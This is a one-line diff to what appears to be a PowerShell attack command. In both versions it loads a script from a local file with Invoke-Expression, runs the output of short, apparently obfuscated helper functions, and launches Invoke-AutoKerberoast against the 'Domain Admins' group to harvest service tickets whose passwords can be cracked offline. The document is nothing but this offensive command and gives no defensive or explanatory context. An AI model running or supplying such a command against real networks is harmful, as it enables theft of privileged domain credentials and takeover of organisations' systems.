@@ -1,1 +1,1 @@
-([string](gc .\autoker.txt))|iex; (de pp ss)|iex; Invoke-AutoKerberoast -Group "Domain Admins" -Domain ""
+([string](gc .\autoker.txt))|iex; (de)|iex; Invoke-AutoKerberoast -Group "Domain Admins" -Domain ""
